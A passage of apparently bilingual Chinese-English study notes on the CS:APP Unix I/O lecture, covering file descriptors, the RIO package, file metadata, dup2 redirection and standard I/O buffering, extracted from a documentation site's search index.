named <code>/</code> (slash)</p> <p>\u200b   Kernel maintains \u5f53\u524d\u5de5\u4f5c\u76ee\u5f55 current working directory (cwd) for ea??</p> <p>\u200b       Modified using the <code>cd</code> command.</p> <p>\u76ee\u5f55\u53c8\u662f\u6307\u5411\u5176\u5b50\u76ee\u5f55\u7684\u6307\u9488\uff0c\u800c\u5b50\u76ee\u5f55\u4e5f\u662f\u6587\u4ef6\u3002</p> <p>\u8def\u5f84\u540d Pathnames</p> <p>\u200b   Locations of files in the hierarchy denoted by pathnames.</p> <p>\u200b       \u7edd\u5bf9\u8def\u5f84 Absolute pathname starts with <code>/</code> and denotes path from root.</p> <p>\u200b           e.g. <code>/home/droh/hello.c</code></p> <p>\u200b       \u76f8\u5bf9\u8def\u5f84 Relative pathnames denotes path from current working directory.</p> <p>\u200b           e.g. <code>../droh/hello.c</code> where cwd is <code>/home/bryant</code>.</p> <p>\u8fd8\u53ef\u4ee5\u7528 <code>~</code>\uff08tilde\uff09 \u6216 <code>~/</code> \u6765\u6307\u5b9a\u76f8\u5bf9\u4e8e\u7528\u6237\u76ee\u5f55\u7684\u8def\u5f84\u540d\u3002</p> <p>\u5229\u7528\u6587\u4ef6\u540d\u5bf9\u6587\u4ef6\u8fdb\u884c\u6253\u5f00\uff08open\uff09\u3001\u8bfb\uff08read\uff09\u3001\u5199\uff08write\uff09\u3001\u5173\u95ed\uff08close\uff09\u64cd\u4f5c\uff0c\u800c\u8fd9\u4e9b\u7a0b\u5e8f\u672c\u8d28\u4e0a\u8fd8\u662f\u4e00\u4e9b\u6587\u4ef6\u3002</p> <p>Opening Files</p> <p>\u200b   Opening a file informs the kernel that you are getting ready to access the file.</p> <pre><code>int fd;    /* file descriptor */\n\nif ((fd = open(\"/etc/hosts\", O_RDONLY)) &lt; 0) {\n    perror(\"open\");\n    exit(1);\n}\n</code></pre> <p>\u6b64\u5904\u6253\u5f00\u6587\u4ef6\uff0c\u9664\u4e86\u6307\u5b9a\u8def\u5f84\u540d\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a\u6574\u6570\u8868\u660e\u6253\u5f00\u65b9\u5f0f\uff0c\u6b64\u5904 <code>O_RDONLY</code> \u5373\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6253\u5f00\u3002\u8fd9\u4e9b\u6574\u6570\u7531\u4e00\u7cfb\u5217\u9884\u5148\u5b9a\u4e49\u597d\u7684\u5e38\u91cf\u6307\u5b9a\uff0c\u4f46\u662f\u4f60\u8981 include \u76f8\u5173\u6587\u4ef6\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u53ef\u4ee5\u81ea\u5df1\u67e5\u5bf9\u5e94\u6574\u6570\u3002</p> <p>\u200b   \uff08\u6253\u5f00\u64cd\u4f5c\uff09\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002Returns a small identifying integer file descriptor.</p> <p>\u200b       <code>fd == -1</code> indicates that an error occurred,</p> <p>\u6587\u4ef6\u63cf\u8ff0\u7b26\u662f\u4e00\u4e2a\u8f83\u5c0f\u7684\u6574\u6570\uff0c\u5e76\u4e14\u987a\u5e8f\u9012\u589e\uff0c\u5176\u5b58\u5728\u4e0a\u9650\uff0c\u5373\u9650\u5236\u4e86\u540c\u65f6\u6253\u5f00\u7684\u6587\u4ef6\u4e4b\u6570\u91cf\u3002\u4f7f\u7528 <code>limit</code> \u547d\u4ee4\u67e5\u770b <code>descriptors</code> \u4e00\u680f\uff0c\u5f97\u5230\u8fd9\u4e2a\u4e0a\u9650\uff08\u4e00\u822c\u662f 1024\uff09\u3002</p> <p>\u6211\u4eec\u5e94\u5f53\u603b\u662f\u8981\u68c0\u67e5\u8fd4\u56de\u503c\uff0c\u4ee5\u907f\u514d\u9519\u8bef\u5e26\u51fa\u65b0\u9519\u8bef\u3002\u4f46\u66f4\u591a\u4eba\u4e0d\u68c0\u67e5\uff0c\u53ea\u662f\u5ffd\u7565\u5b83\u5e76\u7948\u7977\u4e0d\u8981\u51fa\u9519\u3002</p> <p>\u200b   Each process created by a Linux shell begins life with three open files associated with a terminal:</p> <p>\u200b       0: standard input (stdin)</p> <p>\u200b       1: standard output (stdout)</p> <p>\u200b       2: standard error (stderr)</p> <p>Closing Files</p> <p>\u200b   Closing a file informs the kernel that you are finished accessing that file.</p> <pre><code>int fd;     /* file descriptor */\nint retval; /* return value */\n\nif ((retval = close(fd)) &lt; 0) {\n    perror(\"close\");\n    exit(1);\n}\n</code></pre> <p>\u5173\u95ed\u6587\u4ef6\u4e5f\u80fd\u51fa\u9519\uff1f\u80fd\u7684\uff0c\u7279\u522b\u662f\u5728\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u4e2d\u3002</p> <p>\u200b   \u5728\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u4e2d\u5173\u95ed\u4e00\u4e2a\u5df2\u7ecf\u5173\u95ed\u7684\u6587\u4ef6\u663e\u7136\u662f\u4e00\u573a\u707e\u96be\u3002Closing an already closed file is a recipe for disaster in threaded programs (more on this later).</p> <p>\u200b   Moral: Always check return codes, even for seemingly benign function such as <code>close()</code>.</p> <p>Reading Files</p> <p>\u200b   Reading a file copies bytes from the current file position to memory, and then updates file position.</p> <pre><code>char buf[512];\nint fd;        /* file descriptor */\nint nbytes;    /* number of bytes read */\n\n/* Open file fd ... */\n/* Then read up to 512 bytes from file fd */\nif ((nbytes = read(fd, buf, sizeof(buf))) &lt; 0) {\n    perror(\"read\");\n    exit(1);\n}\n</code></pre> <p>\u5728\u4f4e\u7ea7 I/O \u4e2d\uff0c\u8bfb\u51fd\u6570\u5c31\u662f <code>read()</code>\uff0c\u8c03\u7528\u8be5\u51fd\u6570\u9700\u8981\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u4e00\u4e2a\u6307\u5411\u7f13\u51b2\u533a\u7684\u6307\u9488\uff0c\u548c\u6307\u5b9a\u7684\u7f13\u51b2\u533a\u7684\u957f\u5ea6\u4ee5\u907f\u514d\u6ea2\u51fa\u3002\u7f13\u51b2\u533a\u53ef\u4ee5\u901a\u8fc7\u9759\u6001\u5206\u914d\u6216 malloc \u5206\u914d\u5f97\u5230\u3002\u8bfb\u5165\u5b57\u7b26\u9700\u81f3\u5c11\u4e00\u4e2a\uff0c\u5e76\u4e14\u4e00\u5b9a\u4e0d\u4f1a\u8d85\u8fc7\u7f13\u51b2\u533a\u957f\u5ea6\u3002\u5f53\u8bfb\u5165\u7684\u5b57\u8282\u6570\u5c0f\u4e8e\u6307\u5b9a\u7684\u6700\u5927\u503c\u65f6\uff0c\u79f0\u4e3a\u4e0d\u8db3\u503c\uff08short read\uff09\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u79cd\u60c5\u51b5\u3002</p> <p>\u200b   Returns number of bytes read from file <code>fd</code> into <code>buf</code>.</p> <p>\u200b       Return type <code>ssize_t</code> is signed integer.</p> <p>\u200b       <code>nbytes &lt; 0</code> indicates that an error occurred.</p> <p>\u200b       Short counts (<code>nbytes &lt; sizeof(buf)</code>) are possible and errors.</p> <p>Writing Files</p> <p>\u200b   Writing a file copies bytes from memory to the current file position, and then updates current file position.</p> <pre><code>char buf[512];\nint fd;        /* file descriptor */\nint nbytes;    /* number of bytes write */\n\n/* Open file fd ... */\n/* Then write up to 512 bytes from file fd */\nif ((nbytes = write(fd, buf, sizeof(buf))) &lt; 0) {\n    perror(\"write\");\n    exit(1);\n}\n</code></pre> <p>Simple Unix I/O example</p> <p>\u200b   Copying stdin to stdout, one byte at a time.</p> <pre><code>#include \"csapp.h\"\n\nint main(void) {\n    char c;\n    while(Read(STDIN_FILENO, &amp;c, 1) != 0)\n        Write(STDOUT_FILENO, &amp;c, 1);\n    exit(0);\n}\n</code></pre> <p>\u8fd9\u6837\u7684\u4ee3\u7801\u786e\u5b9e\u53ef\u4ee5\uff0c\u4f46\u6bcf\u6b21\u53ea\u64cd\u4f5c\u4e00\u4e2a\u5b57\u8282\u5c06\u4f1a\u5bfc\u81f4\u8fde\u7ef5\u4e0d\u65ad\u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u5bf9\u4e8e\u4e2d\u7b49\u5927\u5c0f\u7684\u6587\u4ef6\uff0c\u65f6\u95f4\u5f00\u9500\u5c31\u5df2\u7ecf\u76f8\u5f53\u5de8\u5927\u3002</p> <p>\u5173\u4e8e\u4e0d\u8db3\u503c On Short Counts</p> <p>\u200b   Short counts can occur in these situations:</p> <p>\u200b       Encountering (end-of-file) EOF on reads.</p> <p>\u200b       EOF \u7684\u60c5\u5f62\u662f\u8fd9\u6837\u7684\uff0c\u5047\u8bbe\u8fd8\u6709 100 \u4e2a\u5b57\u8282\uff0c\u8981\u8bfb\u5165 200 \u4e2a\u5b57\u8282\uff0c\u5148\u8bfb\u5165 100 \u4e2a\u5b57\u8282\uff0c\u7ed9\u51fa\u4e00\u4e2a\u4e0d\u8db3\u503c\uff0c\u8fd4\u56de\u503c\u4e3a 100\uff1b\u518d\u5355\u72ec\u8bfb EOF\uff0c\u8fd4\u56de\u503c\u4e3a 0\uff0c\u4e5f\u662f\u4e0d\u8db3\u503c\u3002</p> <p>\u200b       Reading text lines from a terminal.</p> <p>\u200b       Reading and writing network sockets.</p> <p>\u200b       \u7ec8\u7aef\u8bfb\u5165\u548c\u7f51\u7edc\u8bfb\u5165\u5176\u5b9e\u662f\u4e00\u6837\u7684\uff0c\u5bf9\u4e8e\u8f93\u5165\u5b9e\u9645\u4e0a\u90fd\u62c6\u6210\u4e86\u5c0f\u5305\uff1a\u7ec8\u7aef\u62c6\u89e3\u4e3a\u6bcf\u4e00\u884c\uff0c\u7f51\u7edc\u62c6\u89e3\u4e3a\u6570\u636e\u5305\uff0c\u6570\u636e\u5305\u5927\u5c0f\u53d6\u51b3\u4e8e\u5177\u4f53\u534f\u8bae\uff0c\u901a\u5e38\u7ea6 1000 \u5b57\u8282\u3002</p> <p>\u200b   Short counts never occur in these situations:</p> <p>\u200b       Reading from disk files (except for EOF).</p> <p>\u200b       Writing to disk files.</p> <p>\u200b   Best practice is to always allow for short counts.</p> <p>The RIO Package</p> <p>\u200b   RIO is a set of wrappers that provide efficient and robust I/O in apps, such as network programs that are subject to short counts.</p> <p>\u200b   RIO provides two different kinds of  functions.</p> <p>\u200b       Unbuffered input and output of binary data.</p> <p>\u200b           <code>rio_readn</code> and <code>rio_writen</code>.</p> <p>\u200b       \u4e0d\u5e26\u7f13\u51b2\u7684\u8bfb\u5199\uff0c\u8fd9\u4e9b\u51fd\u6570\u76f4\u5230\u8bfb\u53d6/\u5199\u5165\u8981\u6c42\u7684\u5b57\u8282\u6570\u4e4b\u524d\u4e0d\u4f1a\u505c\u6b62\uff0c\u82e5\u4e0d\u8db3\u5219\u4f1a\u6682\u65f6\u6302\u8d77\u3002\u56e0\u6b64\u82e5\u51fa\u73b0\u9884\u671f\u5916\u7684 EOF \u5c06\u7ed9\u51fa\u4e00\u4e2a\u9519\u8bef\u3002</p> <p>\u200b       Buffered input of text lines and binary data.</p> <p>\u200b           <code>rio_readlineb</code> and <code>rio_readnb</code>.</p> <p>\u200b           Buffered RIO routines are thread-safe and can be interleaved arbitrary on the same descriptor.</p> <p>\u200b       \u5e26\u7f13\u51b2\u7684\u8bfb\u5199\uff0c\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u57fa\u4e8e\u6587\u672c\uff0c\u4e00\u79cd\u57fa\u4e8e\u5b57\u8282\u3002</p> <p>\u200b   Download from [link]</p> <p>\u200b       [link]</p> <p>Unbuffered RIO Input and Output</p> <p>\u200b   Same interface as Unix <code>read</code> and <code>write</code>.</p> <p>\u200b   Especially useful for transferring data on network sockets.</p> <pre><code>#include \"csapp.h\"\n\nssize_t rio_readn(int fd, void *usrbuf, size_t n);\nssize_t rio_writen(int fd, void *usrbuf, size_t n);\n</code></pre> <p>(Return: num. bytes transferred if OK, 0 on EOF (<code>rio_readn</code> only), -1 on error)</p> <p>\u200b       <code>rio_readn</code> returns short count only if encounters EOF.</p> <p>\u200b           Only use it when you know how many bytes to read.</p> <p>\u200b       <code>rio_writen</code> never returns a short count.</p> <p>\u200b       Calls to <code>rio_readn</code> and <code>rio_writen</code> can be interleaved and the same descriptor.</p> <p>Implementation of <code>rio_readn</code></p> <pre><code>/*\n * rio_readn - Robustly read n bytes (unbuffered)\n */\nssize_t rio_readn(int fd, void *usrbuf, size_t n) {\n    size_t nleft = n;\n    ssize_t nread;\n    char *bufp = usrbuf;\n\n    while (nleft &gt; 0) {\n        if ((nread = read(fd, bufp, nleft)) &lt; 0) {\n            if (errno == EINTR) /* Interrupted by sig handler return */\n                nread = 0;      /* and call read() again */\n            else                \n                return -1;      /* errno set by read() */\n        } else if (nread == 0)\n            break;              /* EOF */\n        nleft -= nread;\n        bufp += nread;\n    }\n    return (n - nleft);         /* Return &gt;= 0 */\n}\n</code></pre> <p>Buffered RIO Input Functions</p> <p>\u200b   Efficiently read text lines and binary data from a file partially cached in an internal memory buffer.</p> <pre><code>#include \"csapp.h\"\n\nvoid rio_readinitb(rio_t *rp, int fd);\n\nssize_t rio_readllineb(rio_t *rp, void *usrbuf, size_t maxlen);\nssize_t rio_readnb(rio_t *rp, void *usrbuf, size_t n);\n</code></pre> <p>(Return: num, bytes read if OK, 0 on EOF, -1 on error).</p> <p>\u200b   <code>rio_readlineb</code> reads a text line of up to <code>maxlen</code> bytes from file <code>fd</code> and stores the line in <code>usrbuf</code>.</p> <p>\u200b       Especially useful for reading text lines from network sockets.</p> <p>\u200b   Stopping conditions</p> <p>\u200b       <code>maxlen</code> bytes read.</p> <p>\u200b       EOF encountered.</p> <p>\u200b       Newline (<code>'\\n'</code>) encountered.</p> <p>\u200b   <code>rio_readnb</code> reads up to <code>n</code> bytes from file <code>fd</code>.</p> <p>\u200b   Stopping conditions</p> <p>\u200b       <code>maxlen</code> bytes read.</p> <p>\u200b       EOF encountered.</p> <p>\u200b   Calls to <code>rio_readlineb</code> and <code>rio_readnb</code> can be interleaved arbitrary on the same descriptor.</p> <p>\u200b       Warning: Don't interleave with calls to <code>rio_readn</code>.</p> <p>Buffered I/O: Implementation</p> <p>\u200b   For reading from file.</p> <p>\u200b   File has associated buffered to hold bytes that have been read from file but not yet read by user code.</p> <pre><code>Buffer             |&lt;- rio_cnt -&gt;|\n--------------------------------------------\n| already read     | unread      |         |\n--------------------------------------------\n^                  ^\n|                  |\nrio_buf            rio_bufptr\n</code></pre> <p>\u200b   Layered on Unix file:</p> <pre><code>                 |&lt;------ buffered portion ------&gt;|\n-------------------------------------------------------------\n| not in buffer  | already read     | unread      |         |\n-------------------------------------------------------------\n                                                  ^\n                                                  |\n                              current file position\n</code></pre> <p>Buffered I/O: Declaration</p> <p>\u200b   All information contained in <code>struct</code>.</p> <pre><code>Buffer             |&lt;- rio_cnt -&gt;|\n--------------------------------------------\n| already read     | unread      |         |\n--------------------------------------------\n^                  ^\n|                  |\nrio_buf            rio_bufptr\n</code></pre> <pre><code>typedef struct {\n    int rio_fd;                /* descriptor for this internal buf */\n    int rio_cnt;               /* unread bytes in internal buf */\n    char *rio_bufptr;          /* next unread byte in internal buf */\n    char rio_buf[RIO_BUFSIZE]; /* internal buffer */\n} rio_t;\n</code></pre> <p>RIO Example</p> <p>\u200b   Copying the lines of a text file from standard input to standard output.</p> <pre><code>#include \"csapp.h\"\n\nint main(int argc, char **argv) {\n    int n;\n    rio_t rio;\n    char buf[MAXLINE];\n\n    Rio_readinitb(&amp;rio, STDIN_FILENO);\n    while ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != 0)\n        Rio_writen(STDOUT_FILENO, buf, n);\n    exit(0);\n}\n</code></pre> <p>\u6587\u4ef6\u5143\u6570\u636e File Metadata</p> <p>\u200b   Metadata is data about data, in this case file data.</p> <p>\u200b   Per-file metadata maintained by kernel.</p> <p>\u200b       accessed by users with the <code>stat</code> and <code>fstat</code> functions.</p> <pre><code>/* Metadata returned by the stat and fstat function */\nstruct stat {\n    dev_t         st_dev;     /* Device */\n    ino_t         st_ino;     /* inode */\n    mode_t        st_mode;    /* Pretection and filetype */\n    nlink_t       st_nlink;   /* Number of hard links */\n    uid_t         st_uid;     /* User ID of owner */\n    gid_t         st_gid;     /* Group ID of owner */\n    dev_t         st_rdev;    /* Device type (if inode device) */\n    off_t         st_size;    /* Total size, in bytes */\n    unsigned long st_blksize; /* Blocksize for filesystem */\n    unsigned long st_blocks;  /* Number of blocks allocated */\n    time_t        st_atime;   /* Time of last access */\n    time_t        st_mtime;   /* Time of last modification */\n    time_t        st_ctime;   /* Time of last change */\n};\n</code></pre> <p>Example of Accessing File Metadata</p> <pre><code>int main(int argc, char **argv) {\n    struct stat stat;\n    char *type, *readok;\n\n    Stat(argv[1], &amp;stat);\n    if (S_ISREG(stat.st_mode))        /* Determine file type */\n        type = \"regular\";\n    else if (S_ISDIR(stat.st_mode))\n        type = \"directory\";\n    else \n        type = \"other\";\n    if ((stat.st_mode &amp; S_ISUSR))     /* Check and access */\n        readok = \"yes\";\n    else \n        readok = \"no\";\n\n    printf(\"type: %s, read: %s\\n\", type, readok);\n    exit(0);\n}\n</code></pre> <pre><code>linux&gt; ./statcheck statcheck.c\ntype: regular, read: yes\nlinux&gt; chmod 000 statcheck.c\nlinux&gt; ./statcheck statcheck.c\ntype: regular, read: no\nlinux&gt; ./statcheck ..\ntype directory, read: yes\n</code></pre> <p>How the Unix Kernel Represents Open Files</p> <p>\u200b   \u8fd9\u662f\u4e00\u4e2a\u96be\u70b9\u3002</p> <p></p> <p>File Sharing</p> <p></p> <p>How Processes Share Files: <code>fork</code></p> <p></p> <p></p> <p>I/O Redirection</p> <p>\u200b   Question: How does a shell implement I/O redirection?</p> <p>\u200b       <code>linux&gt; ls &gt; foo.txt</code></p> <p>\u200b   Answer: By calling the <code>dup2(oldfd, newfd)</code> function.</p> <p>\u200b       Copies (per-process) descriptor table entry <code>oldfd</code> to entry <code>newfd</code>.</p> <pre><code>Descriptor table  ----------&gt; Descriptor table \nbefore dup2(4,1)              after dup2(4,1)\n     ------                        ------\nfd 0 |    |                   fd 0 |    |\n     ------                        ------\nfd 1 |a   |                   fd 1 |b   |\n     ------                        ------\nfd 2 |    |                   fd 2 |    |\n     ------                        ------\nfd 3 |    |                   fd 3 |    |\n     ------                        ------\nfd 4 |b   |                   fd 4 |b   |\n     ------                        ------\n</code></pre> <p>I/O Redirection Example</p> <p></p> <p></p> <p>Standard I/O Functions</p> <p>\u200b   The C standard library (<code>libc.so</code>) contains a collection of higher-level standard I/O functions.</p> <p>\u200b       Documented in Appendix B of K&amp;R.</p> <p>\u200b   Examples of standard I/O functions:</p> <p>\u200b       Opening and closing files (<code>fopen</code> and <code>fclose</code>)</p> <p>\u200b       Reading and writing bytes (<code>fread</code> and <code>fwrite</code>)</p> <p>\u200b       Reading and writing text lines (<code>fgets</code> and <code>fputs</code>)</p> <p>\u200b       Formatted reading and writing (<code>fscanf</code> and <code>fprintf</code>)</p> <p>Standard I/O Streams</p> <p>\u200b   Standard I/O models open files as streams.</p> <p>\u200b       Abstraction for a file descriptor and a buffer in memory.</p> <p>\u200b   C programs begin life with three open streams (defined in <code>stdio.h</code>)</p> <p>\u200b       <code>stdin</code> (standard input), <code>stdout</code> (standard output), <code>stderr</code> (standard error).</p> <pre><code>#inlcude &lt;stdio.h&gt;\nextern FILE *stdin;  /* standard input  (descriptor 0) */\nextern FILE *stdout; /* standard output (descriptor 1) */\nextern FILE *stderr; /* standard error  (descriptor 2) */\n\nint main() {\n    fprintf(stdout, \"Hello, world\\n\");\n}\n</code></pre> <p>Buffered I/O: Motivation</p> <p>\u200b   Applications often read/write one character at a time</p> <p>\u200b       <code>getc</code>, <code>putc</code>, <code>ungetc</code></p> <p>\u200b       <code>gets</code>, <code>fgets</code></p> <p>\u200b           Read line of text one character at a time, stopping at newline.</p> <p>\u200b   Implementing as Unix I/O calls expensive</p> <p>\u200b       <code>read</code> and <code>write</code> require Unix kernel calls.</p> <p>\u200b           &gt; 10,000 clock cycles.</p> <p>\u200b   Solutions: Buffered read.</p> <p>\u200b       Use Unix <code>read</code> to grab block of types.</p> <p>\u200b       User input functions take one byte at a time from buffer.</p> <p>\u200b           Refill buffer when empty.</p> <p>Buffering in Standard I/O</p> <p></p> <p>Standard I/O Buffering in Action</p> <p>\u200b   You can see this buffering in action for yourself, using the always fascinating Linux <code>strace</code> program.</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"h\");\n    printf(\"e\");\n    printf(\"l\");\n    printf(\"l\");\n    printf(\"o\");\n    printf(\"\\n\");\n    fflush(stdout);\n    return 0;\n}\n</code></pre> <pre><code>linux&gt; strace ./hello\nexecve(\"./hello\", [\"hello\"], [/* ... */]).\n...\nwrite(1, \"hello\\n\", 6)               = 6\n...\nexit_group(0)                        = ?\n</code></pre> <p>Unix I/O vs. Standard I/O vs. RIO  </p> <p></p> <p>\u4e3a\u4ec0\u4e48\u8fd8\u8981\u81ea\u5df1\u5199\u8f93\u5165\u8f93\u51fa\u51fd\u6570\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6807\u51c6\u5e93\u63d0\u4f9b\u7684\u51fd\u6570\u867d\u7136\u975e\u5e38\u9002\u7528\u4e8e\u5bf9\u7ec8\u7aef\u6216\u6587\u4ef6\u6267\u884c I/O \u64cd\u4f5c\uff0c\u4f46\u4e0d\u592a\u9002\u7528\u4e8e\u7f51\u7edc\u8fde\u63a5\uff0c\u56e0\u4e3a\u5176\u4e0d\u662f\u4e3a\u7f51\u7edc\u8fde\u63a5\u8bbe\u8ba1\u7684\uff0c\u6240\u4ee5\u4e0d\u597d\u7528\u3002\u6240\u4ee5\u8bfe\u7a0b\u63d0\u4f9b\u7684 RIO \u51fd\u6570\u4e3b\u8981\u662f\u7528\u4e8e\u7f51\u7edc\u8fde\u63a5\u3002</p> <p>\u6b64\u5916\uff0c\u5e26\u7f13\u51b2\u7684 I/O \u4e0e RIO I/O \u4e0d\u80fd\u5f88\u597d\u5730\u5171\u5b58\uff0c\u56e0\u4e3a\u5b83\u4eec\u5404\u81ea\u6709\u81ea\u5df1\u5730\u7f13\u51b2\u533a\uff0c\u5f7c\u6b64\u4e4b\u95f4\u4e92\u4e0d\u4e86\u89e3\uff0c\u8fd8\u4f1a\u76f8\u4e92\u5e72\u6270\u3002\u5207\u5fcc\u6df7\u7528\u548c\u5339\u914d\u4f7f\u7528\u3002</p> <p>Pros and Cons of Unix I/O</p> <p>\u200b   Pros</p> <p>\u200b       Unix I/O is the most general and lowest overhead form of I/O.</p> <p>\u200b           All other I/O packages are implemented using Unix I/O functions.</p> <p>\u200b       Unix I/O provides functions for accessing file metadata.</p> <p>\u200b       Unix I/O functions are async-signal-safe and can be used safely in signal handlers.</p> <p>\u200b   Cons</p> <p>\u200b       Dealing with short counts is tricky and error prone.</p> <p>\u200b       Efficient reading of text lines requires some form of buffering, also tricky and error prone.</p> <p>\u200b       Both of these issues are addressed by the standard I/O and RIO I/O.</p> <p>Pros and Cons of Standard I/O</p> <p>\u200b   Pros:</p> <p>\u200b       Buffering increases efficiency by decreasing the number of <code>read</code> and <code>write</code> system calls.</p> <p>\u200b       Short counts are handled automatically.</p> <p>\u200b   Cons:</p> <p>\u200b       Provides no function for accessing file metadata.</p> <p>\u200b       Standard I/O functions are not async-signal-safe, and not appropriate for signal handlers.</p> <p>\u200b       Standard I/O is not appreciate for input and output on network sockets.</p> <p>\u200b           There are poorly documented restrictions on streams that interact badly with restrictions on sockets (CS:APP3e, Sec 10.11)</p> <p>Choosing I/O Functions</p> <p>\u200b   General rule: use the highest-level I/O functions you can.</p> <p>\u200b       Many C programmers are able to do all of their work using the standard I/O functions.</p> <p>\u200b       But, be sure to understand the functions you use!</p> <p>\u200b   When to use standard I/O</p> <p>\u200b       When working with disk or terminal files.</p> <p>\u200b   When to use raw Unix I/O</p> <p>\u200b       Inside signal handlers, because Unix I/O is async-signal-safe.</p> <p>\u200b       In rare cases when you need absolute highest performance.</p> <p>\u200b   When to use RIO</p> <p>\u200b       When you are reading and writing network sockets.</p> <p>\u200b       Avoid using standard I/O on sockets.</p> <p>Aside: Working with Binary Files</p> <p>\u200b   Functions you should never use on binary files:</p> <p>\u200b       Text-oriented I/O such as <code>fgets</code>, <code>scanf</code>, <code>fio_readlineb</code>.</p> <p>\u200b           Interpret EOL characters.</p> <p>\u200b           Use functions like <code>rio_readn</code> or <code>rio_readnb</code> instead.</p> <p>\u200b   String functions</p> <p>\u200b       <code>strlen</code>, <code>strcpy</code>, <code>strcat</code>.</p> <p>\u200b       Interprets byte value 0 (end of string) as special.</p> <p>For Further Information</p> <p>\u200b   The Unix bible:</p> <p>\u200b       W. Richard Stevens &amp; Stephen A. Rago, Advanced Programming in the Unix Environment, 2nd Edition, Addison Wesley, 2005</p> <p>\u200b           Updated from Stevens's 1993 classic text.</p> <p>\u200b   The Linux bible:</p> <p>\u200b       Michael Kerrisk, The Linux Programming Interface, No Starch Press, 2010.</p> <p>\u200b           Encyclopedic and authoritative.</p> <p>Funs with File Descriptors (1)</p> <pre><code>#include \"csapp.h\"\nint main(int argc, char *argv[]) {\n    int fd1, fd2, fd3;\n    char c1, c2, c3;\n    char *fname = argv[1];\n    fd1 = Open(fname, O_RDONLY, 0);\n    fd2 = Open(fname, O_RDONLY, 0);\n    fd3 = Open(fname, O_RDONLY, 0);\n    Dup2(fd2, fd3);\n    Read(fd1, &amp;c1, 1);\n    Read(fd2, &amp;c2, 1);\n    Read(fd3, &amp;c3, 1);\n    printf(\"c1 = %c, c2 = %c, c3 = %c\\n\", c1, c2, c3);\n    return 0;\n}\n</code></pre> <p>\u200b   What would this program print for file containing \"abc\"?</p> <p>Fun with File Descriptors (2)</p> <pre><code>#include \"csapp.h\"\nint main(int argc, char *argv[]) {\n    int fd1;\n    int s = getpid() &amp; 0x1;\n    char c1, c2;\n    char *fname = argv[1];\n    fd1 = Open(fname, O_RDONLY, 0);\n    Read(fd1, &amp;c1, 1);\n    if (fork()) { /* Parent */\n        sleep(s);\n        Read(fd1, &amp;c2, 1);\n        printf(\"Parent: c1 = %c, c2 = %c\\n\", c1, c2);\n    } else {      /* Child */\n        sleep(1-s);\n        Read(fd1, &amp;c2, 1);\n        printf(\"Child: c1 = %c, c2 = %c\\n\", c1, c2);\n    }\n    return 0;\n}\n</code></pre> <p>\u200b   What would this program print for file containing \"abc\"?</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L17-Virtual-Memory-Concepts/","title":"L17 Virtual Memory: Concepts","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=17</p> <p>Today </p> <p>\u200b   Address spaces</p> <p>\u200b   VM as a tool for caching.</p> <p>\u200b   VM as a tool for memory management.</p> <p>\u200b   VM as a tool for memory protection.</p> <p>\u200b   Address translation.</p> <p>A System Using Physical Addressing</p>"},{"location":"out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"\u6982\u8bba","text":"<p>Source: https://sspai.com/prime/story/mkdocs-primer)</p>"},{"location":"out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#mkdocs","title":"\u4ec0\u4e48\u662f MkDocs\uff1f","text":"<p>MkDocs \u5373 MarKdown DOCumentS \u662f\u4e00\u4e2a\u5feb\u901f\u3001\u7b80\u5355\u7684\u9759\u6001\u7f51\u7ad9\u751f\u6210\u5668\uff0c\u7528\u4e8e\u5c06 Markdown \u6587\u6863\u7ec4\u7ec7\u8d77\u6765\u6784\u5efa\u6210\u6709\u5c42\u6b21\u3001\u7f8e\u89c2\u7684\u6587\u6863\u7ad9\u70b9\u3002</p> <p>MkDocs \u57fa\u4e8e Python \u7f16\u5199\uff0c\u4e5f\u8d2f\u5f7b\u4e86 Python \u91cc\u300c\u7b80\u6d01\u80dc\u4e8e\u590d\u6742\u300d\u7684\u7406\u5ff5\uff0c\u4e0e\u5176\u4ed6\u5e38\u89c1\u7684\u9759\u6001\u7f51\u7ad9\u751f\u6210\u5668\u76f8\u6bd4\uff0c\u65e0\u9700\u7e41\u7410\u7684\u73af\u5883\u914d\u7f6e\uff08\u5982 Jekyll \u6d89\u53ca\u7684 Bundler\u3001Gems \u7b49\uff09\uff0c\u6240\u6709\u914d\u7f6e\u90fd\u7528\u53ea\u6709\u7b80\u5355\u7684\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u7ba1\u7406\uff0c\u5e76\u4e14\u5f53\u4e2d\u914d\u7f6e\u9879\u7684\u5185\u5bb9\u4e5f\u4ec5\u6709\u4e00\u9875\u6587\u6863\u3002</p> <p>MkDocs \u89c1\u540d\u77e5\u610f\u5c31\u662f\u4e3a Markdown \u800c\u751f\uff0c\u6839\u636e Markdown \u683c\u5f0f\u5c06\u5185\u5bb9\u6e32\u67d3\u6210\u7f8e\u89c2\u7684\u6587\u6863\uff0c\u5e76\u901a\u8fc7\u76ee\u5f55\u5c42\u7ea7\u5173\u7cfb\u5bf9\u5e94\u6587\u6863\u7684\u6811\u72b6\u7ed3\u6784\uff0c\u4f7f\u5f97\u5f53\u4e2d\u6240\u6709\u7684\u6587\u6863\u7ec4\u7ec7\u5206\u660e\u4e14\u5c42\u6b21\u9012\u8fdb\u3002</p> <p>\u6b64\u5916\uff0c\u7b80\u6d01\u4e0d\u7b49\u540c\u4e8e\u7b80\u5355\uff0cMkDocs 